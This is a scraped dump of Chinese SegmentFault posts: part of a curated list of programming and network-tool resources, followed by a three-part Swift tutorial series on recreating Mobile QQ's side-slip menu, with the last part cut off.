<a href=""https://github.com/jobbole/awesome-sysadmin-cn"" rel=""nofollow noreferrer"">awesome-sysadmin-cn</a>: 伯乐出品的系统管理员资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-ios-cn"" rel=""nofollow noreferrer"">awesome-ios-cn</a>: 伯乐出品的 iOS 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-java-cn"" rel=""nofollow noreferrer"">awesome-java-cn</a>: 伯乐出品的 Java 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-python-cn"" rel=""nofollow noreferrer"">awesome-python-cn</a>: 伯乐出品的 Python 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-c-cn"" rel=""nofollow noreferrer"">awesome-c-cn</a>: 伯乐出品的 C 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-cpp-cn"" rel=""nofollow noreferrer"">awesome-cpp-cn</a>: 伯乐出品的 C++ 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-mysql-cn"" rel=""nofollow noreferrer"">awesome-mysql-cn</a>: 伯乐出品的 MySQL 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-machine-learning-cn"" rel=""nofollow noreferrer"">awesome-machine-learning-cn</a>: 伯乐出品的机器学习资源大全</li>
<li>
<a href=""https://github.com/josephmisiti/awesome-machine-learning"" rel=""nofollow noreferrer"">awesome-machine-learning</a>: 机器学习资源整合</li>
<li>
<a href=""https://github.com/jobbole/awesome-javascript-cn"" rel=""nofollow noreferrer"">awesome-javascript-cn</a>: 伯乐出品的 JavaScript 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-css-cn"" rel=""nofollow noreferrer"">awesome-css-cn</a>: 伯乐出品的 CSS 资源大全</li>
<li>
<a href=""https://github.com/jobbole/awesome-php-cn"" rel=""nofollow noreferrer"">awesome-php-cn</a>: 伯乐出品的 PHP 资源大全</li>
<li>
<a href=""https://github.com/chentsulin/awesome-graphql"" rel=""nofollow noreferrer"">awesome-graphql</a>: Graphql 资源大全</li>
<li>
<a href=""https://github.com/kdeldycke/awesome-falsehood"" rel=""nofollow noreferrer"">awesome-falsehood</a>: 谬误大全, 懂得谬误, 才能更接近真理~</li>
<li>
<a href=""https://github.com/terryum/awesome-deep-learning-papers"" rel=""nofollow noreferrer"">awesome-deep-learning-papers</a>: 深度学习论文大全</li>
<li>
<a href=""https://github.com/webpack-china/awesome-webpack-cn"" rel=""nofollow noreferrer"">awesome-webpack-cn</a>: webpack优秀中文文章</li>
<li>
<a href=""https://github.com/coderplex/awesome-blockchain"" rel=""nofollow noreferrer"">awesome-blockchain</a>: 区块链资源整合</li>
<li>
<a href=""https://github.com/jaywcjlove/awesome-mac"" rel=""nofollow noreferrer"">awesome-mac</a>: Mac 资源整合</li>
</ul>
<h4>前端</h4>
<h6>Web</h6>
<ul>
<li>
<a href=""https://github.com/h5bp/Front-end-Developer-Interview-Questions"" rel=""nofollow noreferrer"">Front-end-Developer-Interview-Questions</a>: 各种前端面试问题</li>
<li>
<a href=""https://github.com/icepy/Front-End-Develop-Guide"" rel=""nofollow noreferrer"">Front-End-Develop-Guide</a>: 汇集了前端开发的主流学习资源</li>
<li>
<a href=""https://github.com/alex/what-happens-when"" rel=""nofollow noreferrer"">what-happens-when</a>: 一篇文章，详细解释了从在浏览器中输入网址之后发生的一切</li>
<li>
<a href=""https://github.com/addyosmani/backbone-fundamentals"" rel=""nofollow noreferrer"">backbone-fundamentals</a>: 关于 Backbone 的一本书，初学和高级都适用</li>
<li>
<a href=""https://github.com/http2/http2-spec"" rel=""nofollow noreferrer"">http2-spec</a>: HTTP 2 草案</li>
<li>
<a href=""https://github.com/aekaplan/grid"" rel=""nofollow noreferrer"">grid</a>: 响应式布局指南</li>
<li>
<a href=""https://github.com/JacksonTian/fks"" rel=""nofollow noreferrer"">fks</a>: 前端技能汇总</li>
<li>
<a href=""https://github.com/jmcunningham/AngularJS-Learning"" rel=""nofollow noreferrer"">AngularJS-Learning</a>: AngularJS 的各种学习资源</li>
<li>
<a href=""https://github.com/getify/You-Dont-Know-JS"" rel=""nofollow noreferrer"">You-Dont-Know-JS</a>: 一个 Javascript 系列图书，主要讲述 JS 的核心概念和机制</li>
<li>
<a href=""https://github.com/BonsaiDen/JavaScript-Garden"" rel=""nofollow noreferrer"">JavaScript-Garden</a>: 一个关于 Javascript 的诡异特性集合</li>
<li>
<a href=""http://lyfeyaj.com/2015/01/07/debugging-angularjs-apps-from-the-console/"" rel=""nofollow noreferrer"">在控制台中调试 AngularJS 应用</a>: 在控制台中调试 AngularJS 应用的几种方法</li>
<li>
<a href=""http://addyosmani.com/resources/essentialjsdesignpatterns/book/"" rel=""nofollow noreferrer"">Learning JavaScript Design Patterns</a>: 学习 Javascript 设计模式</li>
<li>
<a href=""https://github.com/lukehoban/es6features"" rel=""nofollow noreferrer"">es6features</a>: ECMAScript 6 特性概览</li>
<li>
<a href=""https://github.com/addyosmani/es6-tools"" rel=""nofollow noreferrer"">es6-tools</a>: ECMAScript 6 工具集合</li>
<li>
<a href=""https://github.com/bendc/frontend-guidelines"" rel=""nofollow noreferrer"">frontend-guidelines</a>: 前端指南, 主要讲述 HTML, CSS 和 JS 的最佳实践</li>
<li>
<a href=""https://github.com/ruanyf/es6tutorial"" rel=""nofollow noreferrer"">es6tutorial</a>: 《ECMAScript 6入门》是一本开源的JavaScript语言教程，全面介绍ECMAScript 6新增的语法特性。</li>
<li>
<a href=""https://github.com/jmcunningham/AngularJS-Learning"" rel=""nofollow noreferrer"">AngularJS-Learning</a>: AngularJS 学习资源</li>
<li>
<a href=""https://github.com/desandro/practical-ui-physics"" rel=""nofollow noreferrer"">practical-ui-physics</a>: 各种前端物理效果的实现原理</li>
<li>
<a href=""https://github.com/nzakas/understandinges6"" rel=""nofollow noreferrer"">understandinges6</a>: 电子书： Understanding ES6</li>
<li>
<a href=""https://github.com/moklick/frontend-stuff"" rel=""nofollow noreferrer"">frontend-stuff</a>: 前端相关的各种资源, JS 内容居多</li>
<li>
<a href=""https://github.com/dypsilon/frontend-dev-bookmarks"" rel=""nofollow noreferrer"">frontend-dev-bookmarks</a>: 前端开发资源的集合, 内容极多</li>
</ul>
<h6>React</h6>
<ul>
<li>
<a href=""http://reactjs.cn/react/docs/getting-started-zh-CN.html"" rel=""nofollow noreferrer"">React 中文文档</a>: React 中文文档</li>
<li>
<a href=""http://redux.js.org/docs/introduction/"" rel=""nofollow noreferrer"">Redux 英文文档</a>: Redux 英文文档, 比较详尽</li>
<li>
<a href=""http://cn.redux.js.org/index.html"" rel=""nofollow noreferrer"">Redux 中文文档</a>: Redux 中文文档, 比较详尽</li>
</ul>
<h6>IOS</h6>
<ul>
<li>
<a href=""https://github.com/qinjx/30min_guides"" rel=""nofollow noreferrer"">30min_guides</a>: 覃健祥的学习笔记，若干个几十分钟入门的文档</li>
<li>
<a href=""http://numbbbbb.gitbooks.io/-the-swift-programming-language-/content/"" rel=""nofollow noreferrer"">The Swift Programming Language 中文版</a>: The Swift Programming Language 中文版, 苹果官方教程的中文翻译</li>
<li>
<a href=""https://www.cocoacontrols.com/"" rel=""nofollow noreferrer"">cocoacontrols</a>: 包含各种 OSX 或者 IOS 的开源 UI 库或者 商业库</li>
<li>
<a href=""https://github.com/Aufree/trip-to-iOS"" rel=""nofollow noreferrer"">iOS 学习资料整理</a>: IOS 的各种学习资料整理，初学者必备</li>
</ul>
<h6>Android</h6>
<ul>
<li>
<a href=""https://github.com/kesenhoo/android-training-course-in-chinese"" rel=""nofollow noreferrer"">android-training-course-in-chinese</a>: Google Android官方培训课程中文版</li>
<li>
<a href=""https://github.com/inferjay/AndroidDevTools"" rel=""nofollow noreferrer"">AndroidDevTools</a>: Android 收集整理Android开发所需的Android SDK、开发中用到的工具、Android开发教程、Android设计规范，免费的设计素材等</li>
</ul>
<h4>后端</h4>
<h6>Node.js</h6>
<ul>
<li>
<a href=""https://github.com/alsotang/node-lessons"" rel=""nofollow noreferrer"">node-lessons</a>: Node.js 包教不包会</li>
<li>
<a href=""https://github.com/pana/node-books"" rel=""nofollow noreferrer"">node-books</a>: 关于 Node.js 的一些书籍</li>
<li>
<a href=""https://github.com/maxogden/art-of-node"" rel=""nofollow noreferrer"">art-of-node</a>: Node的艺术, 一本简短的书，旨在介绍 Node</li>
<li>
<a href=""http://nodejs.ucdok.com/"" rel=""nofollow noreferrer"">Node.js 实战</a>: 以实战开发中的应用为例的讲解</li>
<li>
<a href=""http://nodeschool.io/"" rel=""nofollow noreferrer"">http://nodeschool.io/</a>: 基于 Node.js 打造的、跑在终端上的开源教学课程。</li>
<li>
<a href=""https://github.com/jabez128/stream-handbook"" rel=""nofollow noreferrer"">stream-handbook</a>: 讲解 Node Stream(流) 的详细教程,中文版</li>
<li>
<a href=""https://github.com/nqdeng/7-days-nodejs"" rel=""nofollow noreferrer"">7-days-nodejs</a>: 七天学会 Node.js</li>
</ul>
<h6>Ruby</h6>
<ul><li>
<a href=""https://github.com/JuanitoFatas/fast-ruby"" rel=""nofollow noreferrer"">fast-ruby</a>: 怎样写出更快的 Ruby</li></ul>
<h6>PHP</h6>
<ul>
<li>
<a href=""https://github.com/walu/phpbook"" rel=""nofollow noreferrer"">phpbook</a>: PHP扩展开发及内核应用</li>
<li>
<a href=""https://github.com/reeze/tipi"" rel=""nofollow noreferrer"">tipi</a>: 深入理解PHP内核</li>
<li>
<a href=""https://github.com/wulijun/php-the-right-way"" rel=""nofollow noreferrer"">php-the-right-way</a>: PHP之道</li>
</ul>
<h6>Go</h6>
<ul><li>
<a href=""https://github.com/astaxie/build-web-application-with-golang"" rel=""nofollow noreferrer"">build-web-application-with-golang</a>: beego 作者写的关于怎么使用 Go 语言开发 web 应用的书</li></ul>
<h6>Bash</h6>
<ul><li>
<a href=""https://github.com/denysdovhan/bash-handbook"" rel=""nofollow noreferrer"">bash-handbook</a>: Bash 手册，教你如何学习 Bash</li></ul>
<h6>接口</h6>
<ul><li>
<a href=""https://github.com/interagent/http-api-design"" rel=""nofollow noreferrer"">http-api-design</a>: 从 Heroku 接口总结出的，如何更好地设计 API 接口</li></ul>
<h4>算法 &amp; 论文</h4>
<ul>
<li>
<a href=""https://github.com/julycoding/The-Art-Of-Programming-By-July"" rel=""nofollow noreferrer"">The-Art-Of-Programming-By-July</a>: 程序员编程艺术：面试和算法心得</li>
<li>
<a href=""https://github.com/papers-we-love/papers-we-love"" rel=""nofollow noreferrer"">papers-we-love</a>: 计算机科学学术论文的一个集合，内容丰富有深度</li>
<li>
<a href=""https://github.com/jikexueyuanwiki/tensorflow-zh"" rel=""nofollow noreferrer"">Tensorflow 中文文档</a>: 人工智能系统 Tensorflow 的中文文档</li>
</ul>
<h4>其他</h4>
<ul>
<li>
<a href=""https://github.com/thoughtbot/til"" rel=""nofollow noreferrer"">til</a>: 今天我们学了什么，thoughtbot 出品，建议 watch</li>
<li>
<a href=""https://github.com/soulteary/tenant-point"" rel=""nofollow noreferrer"">tenant-point</a>: 租房要点，适用于北上广深杭</li>
<li>
<a href=""https://github.com/0xAX/linux-insides"" rel=""nofollow noreferrer"">linux-insides</a>: 关于 Linux 内核的一些知识</li>
<li>
<a href=""http://www.imooc.com/"" rel=""nofollow noreferrer"">慕课网</a>: 在线学习平台，各种编程学习资源</li>
<li>
<a href=""https://github.com/redecentralize/alternative-internet"" rel=""nofollow noreferrer"">alternative-internet</a>: 一些有趣的新型互联网和技术,主要目的是去中心化</li>
<li>
<a href=""https://github.com/the-teacher/cocktails_for_programmers"" rel=""nofollow noreferrer"">cocktails_for_programmers</a>: 程序员鸡尾酒, 一个特意为专业节日“程序员日”而建立的鸡尾酒项目！“程序员日”在每年的第256天。</li>
<li>
<a href=""http://waitbutwhy.com/"" rel=""nofollow noreferrer"">Wait but Why?</a>: 非常有意思的一个网站, 会有一些有趣的观点和文章</li>
<li>
<a href=""https://github.com/samsquire/ideas"" rel=""nofollow noreferrer"">ideas</a>: 有趣的想法, 更多是一个作者对于编程/软件/工具 的思考和整理</li>
<li>
<a href=""https://github.com/X140Yu/Developing_iOS_8_Apps_With_Swift"" rel=""nofollow noreferrer"">Developing_iOS_8_Apps_With_Swift</a>: 斯坦福大学公开课： 如何使用 Swift 开发 iOS8 应用</li>
<li>
<a href=""https://github.com/github/open-source-guide"" rel=""nofollow noreferrer"">Open Source Guide</a>: Github 出品，教你如何做开源项目</li>
<li>
<a href=""https://github.com/kamranahmedse/design-patterns-for-humans"" rel=""nofollow noreferrer"">Design Patterns for Humans</a>: 真正给人看的设计模式</li>
</ul>
<h2>科学上网</h2>
<ul>
<li>
<a href=""https://github.com/clowwindy/ShadowVPN"" rel=""nofollow noreferrer"">ShadowVPN</a>: 科学上网之 VPN</li>
<li>
<a href=""https://github.com/shadowsocks/shadowsocks"" rel=""nofollow noreferrer"">shadowsocks</a>: 科学上网利器(服务器端) ~ 墙外的世界丰富多彩</li>
<li>
<a href=""https://github.com/shadowsocks/shadowsocks-android"" rel=""nofollow noreferrer"">shadowsocks-android</a>: shadowsocks 安卓客户端</li>
<li>
<a href=""https://github.com/clowwindy/gfwlist2pac"" rel=""nofollow noreferrer"">gfwlist2pac</a>: 科学上网之 GFWlist to Pac</li>
<li>
<a href=""https://edgepeek.com/articles/144-ubuntu-12-dot-04-shang-pptp-vpn-da-jian"" rel=""nofollow noreferrer"">PPTP VPN 搭建</a>: PPTP VPN 搭建教程</li>
<li>
<a href=""https://github.com/justjavac/Google-IPs"" rel=""nofollow noreferrer"">Google-IPs</a>: Google 全球 IP 地址库</li>
<li>
<a href=""https://github.com/chengr28/RevokeChinaCerts"" rel=""nofollow noreferrer"">RevokeChinaCerts</a>: 一次性删除所有 CNNIC 证书的工具</li>
<li>
<a href=""https://github.com/getlantern/lantern"" rel=""nofollow noreferrer"">lantern</a>: 新一代翻墙工具, 借助于P2P, 速度很快</li>
<li>
<a href=""https://github.com/racaljk/hosts"" rel=""nofollow noreferrer"">hosts</a>: 科学上网专用Hosts</li>
</ul>
<h2>Git 相关</h2>
<ul>
<li>
<a href=""https://github.com/sitaramc/gitolite"" rel=""nofollow noreferrer"">gitolite</a>: 用于构建 Git 服务器</li>
<li>
<a href=""https://github.com/mroth/lolcommits"" rel=""nofollow noreferrer"">lolcommits</a>: 给自己的 git commit</li>
<li>
<a href=""https://github.com/ndbroadbent/scm_breeze"" rel=""nofollow noreferrer"">scm_breeze</a>: Git 流程的辅助简化工具</li>
<li>
<a href=""https://github.com/maryrosecook/gitlet"" rel=""nofollow noreferrer"">gitlet</a>: Javascript 实现的 Git</li>
<li>
<a href=""https://github.com/creationix/js-git"" rel=""nofollow noreferrer"">js-git</a>: Git 的 Javascript 实现</li>
</ul>
<h2>其他</h2>
<ul>
<li>
<a href=""https://github.com/maciejczyzewski/retter"" rel=""nofollow noreferrer"">retter</a>: 密码学相关的算法库</li>
<li>
<a href=""https://github.com/gorhill/uBlock"" rel=""nofollow noreferrer"">uBlock</a>: Chrome, Firefox, Safari 插件用来屏蔽内容（如广告等），可自定义</li>
<li>
<a href=""https://github.com/rust-lang/rust"" rel=""nofollow noreferrer"">rust</a>: Rust 语言源码</li>
<li>
<a href=""https://github.com/aui/font-spider"" rel=""nofollow noreferrer"">font-spider</a>: 中文 WebFont 自动化压缩工具</li>
</ul>
<p>加一张杀马特的照片</p>
<ul>
<li>
<a href=""https://github.com/algolia/github-awesome-autocomplete"" rel=""nofollow noreferrer"">github-awesome-autocomplete</a>: Github 的浏览器插件, 用于辅助搜索, 更加人性化的搜索结果</li>
<li>
<a href=""https://github.com/bkeepers/dotenv"" rel=""nofollow noreferrer"">dotenv</a>: 用于配置本地环境, 可以为不同的文件夹设置不同的环境</li>
<li>
<a href=""https://github.com/bartobri/no-more-secrets"" rel=""nofollow noreferrer"">No more secrets</a>: 科幻电影中的解密效果</li>
<li>
<a href=""https://github.com/shimohq/chinese-programmer-wrong-pronunciation"" rel=""nofollow noreferrer"">chinese-programmer-wrong-pronunciation</a>: 中国程序员容易发音错误的单词</li>
<li>
<a href=""https://github.com/shengxinjing/programmer-job-blacklist"" rel=""nofollow noreferrer"">programmer-job-blacklist</a>: 程序员找工作黑名单，换工作和当技术合伙人需谨慎啊</li>
<li>
<a href=""https://github.com/k4m4/movies-for-hackers"" rel=""nofollow noreferrer"">movies-for-hackers</a>: 黑客和科幻迷必看电影</li>
</ul>
<h2>License</h2>
<p><a href=""http://creativecommons.org/licenses/by/4.0/"" rel=""nofollow noreferrer""><span class=""img-wrap""><img data-src=""/img/remote/1460000004841696"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Creative Commons License"" title=""Creative Commons License""></span></a></p>
<p>This work is licensed under a <a href=""http://creativecommons.org/licenses/by/4.0/"" rel=""nofollow noreferrer"">Creative Commons Attribution 4.0 International License</a>.</p>

                ", 开发资源总结 (持续整理中) - 2018/7/19 更新,1531972117,369,1,484,1,1,https://segmentfault.com/a/1190000002691861
153,1,0,6,"
                    
<blockquote>
  <p>代码示例：<a rel=""nofollow"" href=""https://github.com/johnlui/SwiftSideslipLikeQQ"">https://github.com/johnlui/SwiftSideslipLikeQQ</a></p>
</blockquote>

<p>本文中，我们将一起使用 UINavigationController 来管理主视图，并实现点击左视图中菜单时，主视图自动联动的功能。本文是本系列文章的终结篇，也是最有难度的一篇，我已经为此编写了 10 小时的代码，前八小时一直在试错。毕竟我只是一个只有三个多月 iOS 开发经验的新手 (～ o ～)Y</p>

<h2>给主视图装上 NavigationBar</h2>

<h3>给 HomeViewController 增加 UINavigationController 父视图</h3>

<p>操作如下图：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006768020"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>修改主视图载入逻辑</h3>

<ol>
<li>使用一个 UIView 对象将 homeViewController.navigationController!.view 和 homeViewController.view 包裹，再加入 self.view。</li>
<li>为了能取到带 navigationController 的 HomeViewController，需要先从 StoryBoard 取出 UINavigationController，再取其第一个 UIViewController 作为 HomeViewController。</li>
</ol>
<p>代码如下：</p>

<pre><code>swift</code><code>mainView = UIView(frame: self.view.frame)
homeNavigationController = UIStoryboard(name: ""Main"", bundle: nil).instantiateViewControllerWithIdentifier(""HomeNavigationController"") as! UINavigationController
homeViewController = homeNavigationController.viewControllers.first as! HomeViewController
mainView.addSubview(homeViewController.navigationController!.view)
mainView.addSubview(homeViewController.view)
self.view.addSubview(mainView)
</code></pre>

<blockquote>
  <p>tips: homeNavigationController 也要设置成 ViewController 的成员变量，这样才能在这种特殊架构下实现对 HomeViewController 的 navigationController 的操作。</p>
</blockquote>

<h3>给 mainView 赋予拖动手势事件</h3>

<pre><code>swift</code><code>// 绑定 UIPanGestureRecognizer
let panGesture = homeViewController.panGesture
panGesture.addTarget(self, action: Selector(""pan:""))
mainView.addGestureRecognizer(panGesture)
</code></pre>

<h3>修改自动归位动画</h3>

<p>修改 doTheAnimate 函数中的 homeViewController.view 为 mainView：</p>

<pre><code>swift</code><code>self.mainView.center = CGPointMake(self.view.center.x + self.distance, self.view.center.y)
self.mainView.transform = CGAffineTransformScale(CGAffineTransformIdentity, proportion, proportion)
</code></pre>

<h3>得益于之前良好的封装，安装 NavigationBar 的工作已经完成</h3>

<h2>实现联动</h2>

<h3>建立 HomeViewController 的子视图控制器</h3>

<p>拖放一个 View Controller，并新建一个 OtherPageViewController: UIViewController 类，将两者绑定：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004865901"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>使用 segue 连接 HomeViewController 和 OtherPageViewController</h3>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004865903"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>在 LeftViewController 中相应单击事件，实现联动！</h3>

<p>修改 LeftViewController 中的 didSelectRowAtIndexPath 方法：</p>

<pre><code>swift</code><code>func tableView(tableView: UITableView, didSelectRowAtIndexPath indexPath: NSIndexPath) {
    let viewController = UIApplication.sharedApplication().keyWindow?.rootViewController as! ViewController

    viewController.homeViewController.titleOfOtherPages = titlesDictionary[indexPath.row]
    viewController.homeViewController.performSegueWithIdentifier(""showOtherPages"", sender: self)

    viewController.showHome()

    tableView.deselectRowAtIndexPath(indexPath, animated: false)
}
</code></pre>

<h3>修改 HomeViewController，传递数据</h3>

<pre><code>swift</code><code>import UIKit

class HomeViewController: UIViewController {

    var titleOfOtherPages = """"

    @IBOutlet var panGesture: UIPanGestureRecognizer!
    override func viewDidLoad() {
        super.viewDidLoad()
    }

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
        // Dispose of any resources that can be recreated.
    }



    // MARK: - Navigation

    // In a storyboard-based application, you will often want to do a little preparation before navigation
    override func prepareForSegue(segue: UIStoryboardSegue, sender: AnyObject?) {
        if segue.identifier == ""showOtherPages"" {
            if let a = segue.destinationViewController as? OtherPageViewController {
                a.PageTitle = titleOfOtherPages
            }
        }
    }

}
</code></pre>

<h3>视图联动已经实现！</h3>

<h2>收尾工作</h2>

<p>主要功能实现了以后，我们还要做一些收尾工作，如首页的 segmentView、各种用户友好的单击事件等。</p>

<h3>设置 segmentView</h3>

<p>在 HomeViewController 内：</p>

<pre><code>swift</code><code>// 设置中间 segmentView 视图
let segmentView = UISegmentedControl(items: [""消息"", ""电话""])
segmentView.selectedSegmentIndex = 0
segmentView.setWidth(60, forSegmentAtIndex: 0)
segmentView.setWidth(60, forSegmentAtIndex: 1)
self.navigationItem.titleView = segmentView
</code></pre>

<h3>给 NavigationBar 的左侧头像和右侧星星增加单击打开左、右视图的功能</h3>

<p>直接从 Xcode 右下角拖放图片资源到相应的位置即可完成图片设置，之后在 ViewController 的合适位置增加下面两行代码：</p>

<pre><code>swift</code><code>homeViewController.navigationItem.leftBarButtonItem?.action = Selector(""showLeft"")
homeViewController.navigationItem.rightBarButtonItem?.action = Selector(""showRight"")
</code></pre>

<h3>给主视图增加点击会主视图功能：</h3>

<p>在 ViewController 的合适位置增加以下代码：</p>

<pre><code>swift</code><code>// 绑定单击收起菜单
let tapGesture = UITapGestureRecognizer(target: self, action: ""showHome"")
mainView.addGestureRecognizer(tapGesture)
</code></pre>

<h3>修正 OtherPageViewController 中返回按钮不能正常相应的问题</h3>

<pre><code>swift</code><code>override func viewDidLoad() {
    super.viewDidLoad()

    self.title = PageTitle
    mainLabel.text = PageTitle

    // 自定义返回按钮
    let backButton = UIBarButtonItem(title: ""く返回"", style: UIBarButtonItemStyle.Plain, target: self, action: ""goBack"")
    self.navigationItem.leftBarButtonItem = backButton

    // 弥补因为返回按钮被替换导致的边缘滑入手势失效的问题
    let gesture = UIPanGestureRecognizer(target: self, action: ""goBack"")
    self.view.addGestureRecognizer(gesture)
}

func goBack() {
    self.navigationController?.popViewControllerAnimated(true)
}
</code></pre>

<h2>查看效果</h2>

<p><span class=""img-wrap""><img data-src=""/img/bVlmsy"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""gif""></span></p>

<h2>《再造 “手机QQ” 侧滑菜单》系列文章到此结束，谢谢大家！</h2>

<p><br></p>

<hr>
<h3>原文：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/447.html"">再造 “手机QQ” 侧滑菜单（三）——视图联动</a>
</h3>

<hr>

                ", 再造 “手机QQ” 侧滑菜单（三）——视图联动,1531972119,382,1,438,1,1,https://segmentfault.com/a/1190000002668882
154,1,0,6,"
                    
<blockquote>
  <p>代码示例：<a rel=""nofollow"" href=""https://github.com/johnlui/SwiftSideslipLikeQQ"">https://github.com/johnlui/SwiftSideslipLikeQQ</a></p>
</blockquote>

<p>本篇文章中，我们将一起使用 Auto Layout 高仿手Q的左侧视图，力争达成从布局到动画的全面类似。由于实现过程繁复，本文将主要讲述思路和心得体会，将不再大段大段地粘贴代码。</p>

<h2>手Q左视图的展现方式</h2>

<h3>细部动画</h3>

<p>仔细观察，在把主页往右拖动时，左侧菜单有一个平移和放大的结合动画，并且有一层黑色遮罩层，透明度在不断变化，如下图：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/83791428759696.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>适配逻辑</h3>

<p>我对比了 4 寸屏幕和 4.7 寸屏幕上的左视图，很明点的一点是，4.7 寸屏幕上的元素尺寸和字体都比 4 寸屏幕上的大一点，并且有明显的模糊，故手Q采用的应该是 4 寸以上屏幕等比放大的方案。</p>

<p>对比图如下：</p>

<p>4 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/93d41428759520.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>4.7 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/baa21428759520.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h2>开始仿制</h2>

<p>弄明白手Q的实现细节之后，我们就开始着手实现界面及功能了。</p>

<h3>使用 StoryBoard 构造左视图</h3>

<p>在 StoryBoard 中新增一个 View Controller，并新增一个名为 LeftViewController 的 UIViewController 类，并在 StoryBoard 中完成绑定。然后搭建出左视图的界面，并使用 Auto Layout 进行完全约束。</p>

<p>注：</p>

<ul>
<li>不熟悉 Auto Layout 的同学可以阅读<a rel=""nofollow"" href=""http://lvwenhan.com/ios/430.html"">《Auto Layout 使用心得》</a>系列文章。</li>
<li>在普通 UIViewController 中使用 UITableView 的方法请看：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/429.html"">《如何在普通 UIViewController 中使用 UITableView》</a>
</li>
</ul>
<p>效果图如下：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/9ce21428762234.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>上图中我为了能够显示出白色的字把 LeftViewController 主 view 的背景调成了绿色，默认使用 Default 即可（透明色）。</p>

<h3>取出左视图并增加遮罩层</h3>

<p>代码：<a rel=""nofollow"" href=""https://github.com/johnlui/SwiftSideslipLikeQQ/blob/master/SwiftSideslipLikeQQ/ViewController.swift#L34-L50"">https://github.com/johnlui/SwiftSideslipLikeQQ/blob/master/SwiftSidesl...</a></p>

<p>这里有一点心得体会：为了保证 LeftViewController 中各类事件的正常相应，需要给 ViewController 增加成员变量（对象）：</p>

<pre><code>swift</code><code>var leftViewController: LeftViewController!
</code></pre>

<p>这跟 <a rel=""nofollow"" href=""http://lvwenhan.com/ios/439.html"">《AVAudioPlayer 如何在页面呈现之后按需初始化》</a> 中提出的解决方案是一个道理。</p>

<h3>完善跟左视图有关的动画代码，过于繁复请大家直接参考项目代码，此处不再表述：</h3>

<p><a rel=""nofollow"" href=""https://github.com/johnlui/SwiftSideslipLikeQQ/blob/master/SwiftSideslipLikeQQ/ViewController.swift"">https://github.com/johnlui/SwiftSideslipLikeQQ/blob/master/SwiftSidesl...</a></p>

<h2>查看效果</h2>

<h3>动画效果</h3>

<p><span class=""img-wrap""><img data-src=""/img/bVll4m"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""gif""></span></p>

<h3>适配性</h3>

<p>3.5 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/1f101428762234.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>4.0 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/e93a1428762234.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>4.7 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/d8061428762233.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>5.5 寸：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/75ef1428762348.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<blockquote>
  <p>下一步：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/447.html"">再造 “手机QQ” 侧滑菜单（三）——视图联动</a></p>
</blockquote>

<p><br></p>

<hr>
<h3>原文：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/446.html"">再造 “手机QQ” 侧滑菜单（二）——高仿左视图</a>
</h3>

<hr>

                ", 再造 “手机QQ” 侧滑菜单（二）——高仿左视图,1531972121,559,1,686,1,1,https://segmentfault.com/a/1190000002667249
155,1,0,6,"
                    
<h4>本系列文章中，我们将尝试再造手机QQ的侧滑菜单，力争最大限度接近手Q的实际效果，并使用 Auto Layout 仿造左侧菜单，实现和主视图的联动。</h4>

<blockquote>
  <p>代码示例：<a rel=""nofollow"" href=""https://github.com/johnlui/SwiftSideslipLikeQQ"">https://github.com/johnlui/SwiftSideslipLikeQQ</a></p>
</blockquote>

<h2>基本数据采集</h2>

<p>初步体验，手Q采用的应该是线性动画，即缩放比例等随着手指滑动的距离以一次方程的形式变化。动画达到最大幅度时截图如下（4.7 寸）：</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/baa21428722006.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<p>提取基本数据：</p>

<ol>
<li>右侧主视图左边界距离屏幕左边界的距离占屏幕宽度的比例为：78%</li>
